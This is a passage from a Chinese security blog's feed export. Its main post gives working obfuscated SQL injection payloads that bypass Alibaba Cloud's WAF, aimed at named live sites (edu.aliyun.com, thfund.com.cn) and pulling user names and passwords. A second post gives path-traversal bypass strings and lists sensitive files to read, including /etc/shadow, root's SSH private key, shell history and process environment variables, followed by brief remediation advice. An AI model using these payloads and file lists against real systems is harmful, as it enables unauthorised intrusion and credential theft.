参考</h1><p>本文内容主要参考了互联网上公开的一些总结和经验，吸收学习然后测试再整合到一起，目标是尽量全面、细节的讲述目前主流绕WAF的思路、方法和限制，感谢如下作者的无私奉献，我只是一名搬运工😂</p><p><a href="https://cshihong.github.io/2020/06/14/WAF基本原理与部署方式/" target="_blank" rel="noopener">WAF基本原理与部署方式</a></p><p><a href="https://www.qiaoyue.net/2019/WAF绕过的捷径与方法/" target="_blank" rel="noopener">WAF绕过的捷径与方法</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/145" target="_blank" rel="noopener">WAF建设运营及AI应用实践</a></p><p><a href="https://www.anquanke.com/post/id/177044" target="_blank" rel="noopener">对过WAF的一些认知</a></p><p><a href="https://xz.aliyun.com/t/15" target="_blank" rel="noopener">WAF攻防研究之四个层次Bypass WAF</a></p><p><a href="https://paper.seebug.org/218/" target="_blank" rel="noopener">我的WafBypass之道（SQL注入篇）</a></p><p><a href="https://zhengbao.wang/从http协议层面和数据库层面绕过waf/" target="_blank" rel="noopener">从http协议层面和数据库层面绕过waf</a></p><p><a href="https://www.cnblogs.com/feizianquan/p/10983442.html" target="_blank" rel="noopener">sql注入100种姿势过waf:waf 了解 — 痱子</a></p><p><a href="https://www.freebuf.com/column/163469.html" target="_blank" rel="noopener">WAF攻防之SQL注入篇</a></p><p><a href="https://blog.csdn.net/wutianxu123/article/details/104260945" target="_blank" rel="noopener">web渗透–64–常见的WAF绕过方法</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9087924.html" target="_blank" rel="noopener">Bypass 360主机卫士SQL注入防御（多姿势）</a></p><p><a href="https://www.aqniu.com/vendor/58154.html" target="_blank" rel="noopener">中国网络安全细分领域矩阵图</a></p><p><a href="https://2018.appsec.eu/presos/Hacker_WAF-Bypass-Techniques_Soroush-Dalili_AppSecEU2018.pptx" target="_blank" rel="noopener">WAF bypass techniques</a></p><p><a href="https://github.com/irsdl/httpninja" target="_blank" rel="noopener">HTTP.ninja</a></p><p><a href="https://xz.aliyun.com/t/6422#toc-3" target="_blank" rel="noopener">Awesome-WAF</a></p><p><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="noopener">Web Application Firewall (WAF) Evasion Techniques</a></p><p><a href="https://juejin.im/post/6844903991948771342" target="_blank" rel="noopener">揭秘阿里云WAF背后神秘的AI智能防御体系</a></p><p><a href="http://blog.nsfocus.net/web-anomaly-detection-based-machine-learning/" target="_blank" rel="noopener">基于机器学习的WEB异常检测</a></p><p>同时，欢迎各位同学补充学习过程中发现的新姿势。</p><p>本篇测试结果主要以云WAF的mysql注入为主，后续会根据需求继续补充针对其他数据库的特性，以及其他漏洞类型的绕过。</p>]]></content>
      
      
      <categories>
          
          <category> 攻防对抗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByPass阿里云盾-SQL注入篇</title>
      <link href="/2019/12/12/ByPass%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BE-SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2019/12/12/ByPass%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BE-SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="测试时间："><a href="#测试时间：" class="headerlink" title="测试时间："></a>测试时间：</h2><p>2019/12/11</p><h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><table><thead><tr><th style="text-align:left">环境</th><th style="text-align:left">版本</th></tr></thead><tbody><tr><td style="text-align:left">php</td><td style="text-align:left">5.4.45</td></tr><tr><td style="text-align:left">mysql</td><td style="text-align:left">5.5.53</td></tr><tr><td style="text-align:left">Apache</td><td style="text-align:left">2.4.23</td></tr><tr><td style="text-align:left">WAF</td><td style="text-align:left"><a href="http://edu.aliyun.com/" target="_blank" rel="noopener">edu.aliyun.com</a><br><a href="http://anfu360.wiki.qihoo.net:8080/www.thfund.com.cn" target="_blank" rel="noopener">thfund.com.cn</a></td></tr></tbody></table><h2 id="联合"><a href="#联合" class="headerlink" title="联合"></a>联合</h2><p>绕过规则拆解：HPP参数污染 + –%20pp%0a + union all()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#payload1</span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=-1.union all (--%20pp%0aselect--%20pp%0a 1,2,version%23pp%0a())--+</span><br><span class="line">#union select 1,2,version()</span><br><span class="line"> </span><br><span class="line">#payload2</span><br><span class="line">-1--%20pp%0aunion--%20pp%0a all --%20pp%0aselect--%20pp%0adistinct%20--%20x%0auser--%20%0a(),user--%20pp%0a(),--+  </span><br><span class="line">#union select user(),user(),3</span><br><span class="line"> </span><br><span class="line">#数字型       </span><br><span class="line">order by</span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=-1--%20pp%0aorder%23--%20pp%0aby--%20pp%0a200--</span><br><span class="line">union select               </span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=-1--%20pp%0aunion--%20pp%0a all --%20pp%0aselect--%20pp%0adistinct%20--%20x%0a1,user--%20pp%0a(),3from 0x45d limit--%20pp%0a0,1--+</span><br><span class="line">#union select user 1,2,3 from xx limit 0,1</span><br><span class="line"> </span><br><span class="line">#字符型</span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=-1&apos;--%20pp%0aunion--%20pp%0a all --%20pp%0aselect--%20pp%0adistinct%20--%20x%0a1,user--%20pp%0a(),3from 0x45d limit--%20pp%0a0,1--+</span><br></pre></td></tr></table></figure><p><img src="/2019/12/12/ByPass阿里云盾-SQL注入篇/image-20200905220248297.png" alt="image-20200905220248297"></p><p><img src="/2019/12/12/ByPass阿里云盾-SQL注入篇/image-20200905220328642.png" alt="image-20200905220328642"></p><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://edu.aliyun.com/?id=x&amp;id=true|updatexml--%20pp%0a(1,1,1),1)--+</span><br><span class="line">#updatexml(1,concat(1,1,1),1)--+</span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=true|updatexml--%20pp%0a(1,concat--%20pp%0a (1,(select--%20pp%0adistinct%20--%20x%0auser--%20pp%0a()),0x3a),1)--+</span><br><span class="line">#updatexml(1,concat(1,(select user()),0x3a),1)--+</span><br><span class="line"> </span><br><span class="line">#数字型</span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=true|updatexml--%20pp%0a(1,concat--%20pp%0a (1,(select--%20pp%0adistinct%20--%20x%0apassword from users limit--%20pp%0a0,1),0x3a),1)--+</span><br><span class="line">#updatexml(1,concat (1,(select distinct password from users limit 0,1),0x3a),1)</span><br><span class="line"> </span><br><span class="line">#字符型</span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=(1)&apos;|updatexml--%20pp%0a(1,concat--%20pp%0a (1,(select--%20pp%0adistinct%20--%20x%0apassword from users limit--%20pp%0a0,1),0x3a),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2019/12/12/ByPass阿里云盾-SQL注入篇/image-20200905220416612.png" alt="image-20200905220416612"></p><p><img src="/2019/12/12/ByPass阿里云盾-SQL注入篇/image-20200905220428935.png" alt="image-20200905220428935"></p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>绕过规则拆解：HPP参数污染 + (00)–(1) + –%20pp%0a</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://edu.aliyun.com/?id=x&amp;id=(00)--(--%20pp%0asubstr((select--%20x%0adistinct%20--%20x%0auser--%20%0a()),1,1)=&apos;x&apos;)-- s                  </span><br><span class="line">#(00)--(substr((select distinct user()),1,1)=&apos;x&apos;)-- s</span><br><span class="line"> </span><br><span class="line">#数字型</span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=(00)--(--%20pp%0asubstr((select--%20x%0adistinct%20--%20x%0ausername from users limit--%20pp%0a0,1),1,1)=&apos;d&apos;)-- s</span><br><span class="line"> </span><br><span class="line">#字符型</span><br><span class="line">https://edu.aliyun.com/?id=x&amp;id=1e0&apos;--%20pp%0a^ (01)--(--%20pp%0asubstr((select--%20x%0adistinct%20--%20x%0ausername--%20pp%0afrom--%20pp%0ausers limit--%20pp%0a0,1),1,1)=0x44)-- s</span><br></pre></td></tr></table></figure><p><img src="/2019/12/12/ByPass阿里云盾-SQL注入篇/image-20200905220500829.png" alt="image-20200905220500829"></p><p><img src="/2019/12/12/ByPass阿里云盾-SQL注入篇/image-20200905220517669.png" alt="image-20200905220517669"></p><p>下面有几篇讲SQL ByPass的文章，对学习绕过这块有很大帮助：</p><p><a href="https://security.yirendai.com/news/share/15" target="_blank" rel="noopener">https://security.yirendai.com/news/share/15</a><br><a href="https://www.freebuf.com/articles/web/163783.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/163783.html</a><br><a href="https://paper.seebug.org/218/" target="_blank" rel="noopener">https://paper.seebug.org/218/</a><br><a href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/" target="_blank" rel="noopener">https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/</a></p>]]></content>
      
      
      <categories>
          
          <category> 攻防对抗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件读取漏洞之针对Linux文件系统的利用</title>
      <link href="/2019/12/04/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%92%88%E5%AF%B9Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2019/12/04/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%92%88%E5%AF%B9Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>比如存在文件下载/读取漏洞，在不知道源码位置的情况下，利用Linux的文件系统进行信息收集，可以慢慢的寻找到网站部署位置或者整个源码。</p><h2 id="首先挖掘漏洞"><a href="#首先挖掘漏洞" class="headerlink" title="首先挖掘漏洞"></a>首先挖掘漏洞</h2><p>实现目录穿越</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../../../../../../../../../要足够多</span><br></pre></td></tr></table></figure><p>如果../被替换为空，可以尝试双写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..././</span><br><span class="line">.....///</span><br></pre></td></tr></table></figure><p>如果../被拦截，还可以利用正则（要看中间件是否支持）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat .?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/etc/passwd</span><br><span class="line">cat /.$@./etc/passwd//在任何目录都可以读取</span><br></pre></td></tr></table></figure><p>有的开发者过滤检测的是../../ ../../../，emmmmmmm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..//..//..//..//..//..//..//..//..//..//..//..//..//..//   //针对../../过滤</span><br><span class="line">../..//../..//../..//../..//../..//../..//../..//../..//   //针对../../../过滤</span><br></pre></td></tr></table></figure><p>还可以尝试编码</p><blockquote><p>前提是服务器端能够识别此编码并解析</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..%5c/..%5c/..%5c/..%5c///url编码</span><br><span class="line">..%255c/..%255c/..%255c/..%255c///url二次编码</span><br><span class="line">unicode/UTF-8编码/其他编码</span><br></pre></td></tr></table></figure><p>也可以尝试下这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ..\/..\/etc/passwd</span><br></pre></td></tr></table></figure><p>如果是windows环境,还可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\..\</span><br></pre></td></tr></table></figure><p>Tomcat支持如下路径</p><blockquote><p>文件读取路径可能不太行</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../..;/</span><br><span class="line">../..;a=b/</span><br></pre></td></tr></table></figure><h2 id="开始信息收集"><a href="#开始信息收集" class="headerlink" title="开始信息收集"></a>开始信息收集</h2><p>查看系统用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd//如果passwd黑名单，可以尝试其他不敏感的文件</span><br></pre></td></tr></table></figure><p>判断当前web服务的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow//root权限才可以读取</span><br></pre></td></tr></table></figure><p>系统版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/version</span><br><span class="line">/etc/redhat-release//RHEL系</span><br><span class="line">/etc/issue//登陆提示</span><br><span class="line">/etc/issue.net//远程登陆提示</span><br><span class="line">/etc/motd//登陆后提示</span><br></pre></td></tr></table></figure><p>网络配置信息</p><p>Red Hat Linux 系列网络配置文件路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/sysconfig/network-scripts/ifcfg-ethX      # IP地址，子网掩码等配置文件</span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-lo        # 回环网卡配置</span><br><span class="line">/etc/sysconfig/network                         # 主机名和网关配置文件</span><br><span class="line">/etc/resolv.conf                               # DNS配置文件</span><br><span class="line">/etc/hosts                                     # 主机和IP绑定信息</span><br></pre></td></tr></table></figure><p>Debian / Ubuntu Linux 网络配置文件路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/network/interfaces                        # IP地址，子网掩码等配置文件</span><br><span class="line">/etc/resolv.conf                               # DNS</span><br><span class="line">/etc/hostname                                  # 全局主机名配置</span><br><span class="line">/etc/hosts                                     # 主机和IP绑定信息</span><br></pre></td></tr></table></figure><p>suse Linux 网络配置文件路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/sysconfig/network/ifcfg-eth-id-HWaddr     # IP地址，子网掩码等配置文件</span><br><span class="line">/etc/HOSTNAME                                  # 全局主机名配置</span><br><span class="line">/etc/resolv.conf                               # DNS配置文件</span><br><span class="line">/etc/sysconfig/network/routes                  # 网关配置文件</span><br><span class="line">/etc/hosts                                     # 主机和IP绑定信息</span><br></pre></td></tr></table></figure><p>Slackware Linux 网络配置文件路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.d/rc.inet1.conf                        # IP地址，子网掩码等配置文件</span><br><span class="line">/etc/resolv.conf                               # DNS</span><br><span class="line">/etc/hostname                                  # 全局主机名配置</span><br><span class="line">/etc/networks                                  # 设置网络号等相关信息</span><br><span class="line">/etc/hosts                                     # 设置主机和IP地址绑定</span><br></pre></td></tr></table></figure><p>日志文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/boot.log//系统在引导过程中发生的事件</span><br><span class="line">/var/<span class="built_in">log</span>/lastlog//最后一次用户成功登陆的时间、登陆IP</span><br><span class="line">/var/<span class="built_in">log</span>/messages //记录Linux操作系统常见的系统和服务错误信息</span><br><span class="line">/var/<span class="built_in">log</span>/syslog//记录警告信息，系统问题信息，可使用lastlog查看</span><br><span class="line">/var/<span class="built_in">log</span>/secure //记录用户和工作组变化、用户登陆认证信息</span><br><span class="line">/var/<span class="built_in">log</span>/btmp//记录Linux登陆失败的用户、时间以及远程IP地址</span><br><span class="line">/var/<span class="built_in">log</span>/wtmp//记录每个用户登录、注销及系统的启动、停机的事件，可使用last命令查看</span><br><span class="line">/var/run/utmp//该日志文件记录有关当前登录的每个用户的信息。可使用who/w/users/finger查看</span><br><span class="line">/var/<span class="built_in">log</span>/httpd/access_log//apache访问日志</span><br><span class="line">/var/<span class="built_in">log</span>/httpd/error_log//错误日志</span><br><span class="line"><span class="comment">#root或者其他用户家目录下的文件</span></span><br><span class="line">~/.viminfo//vim打开文件历史</span><br><span class="line">~/.bash_history //历史命令</span><br><span class="line">~/.wget-hsts //wget历史</span><br><span class="line">~/.mysql_history//mysql命令历史</span><br></pre></td></tr></table></figure><p>计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#crontab</span></span><br><span class="line">/etc/crontab//crontab配置文件</span><br><span class="line">/etc/anacrontab//anacrontab配置文件</span><br><span class="line">/etc/cron.*/目录   //cron.d/.daily/.hourly/.monthly/.weekly</span><br><span class="line">/etc/cron.allow//指定那些用户可以使用crontab</span><br><span class="line">/etc/cron.deny//指定哪些用户禁止使用crontab</span><br><span class="line">/var/spool/cron/USERNAME//各用户计划任务配置文件</span><br><span class="line"><span class="comment">#at</span></span><br><span class="line">/var/spool/at///at计划任务的目录</span><br><span class="line">/etc/at.deny//不能使用at命令的用户</span><br><span class="line">/etc/at.allow//允许使用at命令的用户</span><br></pre></td></tr></table></figure><p>应用配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/etc/fstab//文件系统格式表</span><br><span class="line">/etc/my.cnf //mysql的配置文件</span><br><span class="line">/etc/rsyncd.conf//同步程序配置文件</span><br><span class="line"><span class="comment">#ssh</span></span><br><span class="line">/etc/ssh/sshd_config//ssh配置文件</span><br><span class="line">/root/.ssh/id_rsa//私钥，万一中奖了呢</span><br><span class="line">/root/.ssh/authorized_keys//公钥</span><br><span class="line"></span><br><span class="line"><span class="comment">#网络配置&amp;&amp;访问控制</span></span><br><span class="line">/etc/protocols//可以对比是否有新增的协议</span><br><span class="line">/etc/services//可以对比是否有新增的端口</span><br><span class="line">/etc/sysconfig/iptables//iptables规则</span><br><span class="line">/etc/hosts.allow//网络连接的白名单</span><br><span class="line">/etc/hosts.deny//黑名单//使用的很少，更多是iptables</span><br><span class="line"></span><br><span class="line"><span class="comment">#shell&amp;&amp;bash</span></span><br><span class="line">/etc/shells//支持的shell</span><br><span class="line">/etc/sudoers//sudo配置文件</span><br><span class="line">/etc/rc.d/rc.local//系统启动时执行的文件</span><br><span class="line">/etc/bashrc //使用bash时，可设置全局环境配置</span><br><span class="line">~/.bashrc//针对某个用户的配置，会调用/etc/bashrc</span><br><span class="line">~/.bash_profile  //针对某个用户的配置，会调用.bash_rc</span><br><span class="line">~/.bash_logout//用户退出时执行</span><br><span class="line">/etc/profile//全局交互式shell环境配置</span><br><span class="line">/root/.profile//用户交互式shell环境配置</span><br><span class="line"></span><br><span class="line"><span class="comment">#FTP</span></span><br><span class="line">/etc/group//用户组配置文件</span><br><span class="line">/etc/ftpconvions //FTP服务器配置文件</span><br><span class="line">/etc/ftpgroups//FTP服务器配置文件</span><br><span class="line">/etc/ftpaccess//FTP访问控制文件</span><br><span class="line">/etc/ftpusers//不允许ftp的用户列表</span><br><span class="line">/etc/proftpd.conf</span><br><span class="line">/etc/samba/smb.conf//SAMBA 服务器配置文件</span><br><span class="line">/etc/smb.conf</span><br></pre></td></tr></table></figure><p>web服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Apache</span></span><br><span class="line">/etc/apache2/apache2.conf//apache2配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf//apache配置文件</span><br><span class="line">/etc/httpd/conf.d/*.conf//其他配置文件</span><br><span class="line">/etc/httpd/run/httpd.pid//http服务进程号</span><br><span class="line">/etc/php/7.x/cli/php.ini//PHP配置文件</span><br><span class="line">/etc/php/7.x/apache2/php.ini</span><br><span class="line"><span class="comment">#Tomcat</span></span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/server.xml//主配置文件</span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/context.xml//默认context容器</span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/web.xml//应用程序的部署描述符文件</span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/tomcat-users.xml//角色(授权用户)配置文件</span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/Catalina/<span class="variable">$&#123;hostName&#125;</span>/xxx.xml</span><br><span class="line">这里还可以再补补</span><br></pre></td></tr></table></figure><p>使用 /proc <strong>虚拟文件系统</strong>来访问 Linux 内核</p><p>proc文件系统是一个虚拟文件系统，它存储了当前内核运行状态相关文件，并且文件的内容都是动态创建的。用户可以通过查看这些文件获取系统状态以及当前正在运行的进程信息。</p><p><img src="/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/image-20191202205425987.png" alt="image-20191202205425987"></p><p>可以看到有三类内容：</p><ul><li>普通文件，如version，它存放的是内核版本相关信息</li><li>以数值命名的文件夹，如1，它存放的是init进程相关信息</li><li>非数字命名的文件夹，如drivers，它存放的是驱动相关信息</li></ul><p>左边是一系列数字编号的文件，每个实际上都是一个目录，表示系统中的一个进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ls -a /proc</span><br><span class="line">774  acpi         iomem        mtrr           uptime</span><br><span class="line">775  asound       ioports      net            version</span><br><span class="line">781  buddyinfo    irq          pagetypeinfo   version_signature</span><br><span class="line">782  bus          kallsyms     partitions     vmallocinfo</span><br><span class="line">8    cgroups      kcore        sched_debug    vmstat</span><br><span class="line">813  cmdline      keys         schedstat      zoneinfo</span><br><span class="line">9    consoles     key-users    scsi</span><br><span class="line">973  cpuinfo      kmsg         self</span><br><span class="line">974  crypto       kpagecgroup  slabinfo</span><br><span class="line">978  devices      kpagecount   softirqs</span><br><span class="line">98   diskstats    kpageflags   <span class="built_in">stat</span></span><br><span class="line">983  dma          loadavg      swaps</span><br><span class="line">984  driver       locks        sys</span><br><span class="line">987  execdomains  mdstat       sysrq-trigger</span><br><span class="line">99   fb           meminfo      sysvipc</span><br><span class="line">994  filesystems  misc         thread-self</span><br><span class="line">996  fs           modules      timer_list</span><br><span class="line">998  interrupts   mounts       tty</span><br><span class="line">（列出部分内容）</span><br></pre></td></tr></table></figure><p>内核相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/proc/mounts//系统当前挂载的所有文件系统</span><br><span class="line">/proc/net/arp//arp表</span><br><span class="line">/proc/net/route//路由表</span><br></pre></td></tr></table></figure><p>/proc/pid下文件夹和文件内容</p><p><img src="/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/image-20191202222156299.png" alt="image-20191202222156299"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmdline //用于开始进程的命令</span><br><span class="line">cwd //当前进程工作目录的一个符号链接</span><br><span class="line">environ //可用进程环境变量的列表</span><br><span class="line">exe //正在进程中运行的程序链接</span><br><span class="line">fd/ //这个目录包含了进程打开的文件描述符</span><br><span class="line">mem //进程在内存中的内容</span><br><span class="line">status //进程的状态信息</span><br><span class="line">statm //进程的内存使用信息</span><br><span class="line">limits //进程的软限制，硬限制等信息</span><br><span class="line">maps //进程的内存区域映射信息</span><br><span class="line">stack //当前进程的内核调用栈信息</span><br><span class="line">syscall //进程正在执行的系统调用</span><br><span class="line">task //进程下的线程信息</span><br><span class="line"></span><br><span class="line">/proc/self/cmdline //获取当前进程执行的命令行参数</span><br><span class="line">/proc/&#123;PID&#125;/cmdline//遍历PID号</span><br><span class="line"><span class="comment">#环境变量</span></span><br><span class="line">/proc/self/environ//当前环境变量</span><br><span class="line">/proc/&#123;PID&#125;/environ</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>黑名单的形式总是容易被绕过。</p><ol><li>根据实际功能，可以考虑使用白名单方式修复，例如限定所能读取的文件类型为图片类型。</li><li>如果传输参数进行了编码操作，后端接收参数先解码，后校验内容；  </li><li>针对参数中的路径穿越关键字“..”进行检测，拦截并响应非法提交，记录ip检测攻击行为；  </li><li>部署项目后及时删除打包的源码或者WAR包，降低安全风险；  </li><li>建议开发者遵循安全编码规范，对传输的可控参数进行严格检验。  </li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/50338503" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/50338503</a></p><p><a href="https://blog.csdn.net/skypeGNU/article/details/14519775" target="_blank" rel="noopener">https://blog.csdn.net/skypeGNU/article/details/14519775</a></p><p><a href="https://blog.csdn.net/wuseyukui/article/details/24498751" target="_blank" rel="noopener">https://blog.csdn.net/wuseyukui/article/details/24498751</a></p><p>如果有欠缺的地方，欢迎各位大佬补充。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路径穿越 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
